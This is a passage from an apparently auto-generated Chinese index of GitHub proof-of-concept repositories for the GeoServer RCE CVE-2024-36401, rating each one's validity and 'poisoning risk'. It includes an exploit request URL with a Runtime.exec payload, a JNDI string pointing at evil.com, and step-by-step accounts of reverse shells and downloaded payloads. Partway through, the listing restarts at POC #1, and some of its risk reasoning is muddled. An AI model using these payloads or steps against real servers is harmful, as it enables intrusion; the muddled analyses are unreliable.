POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
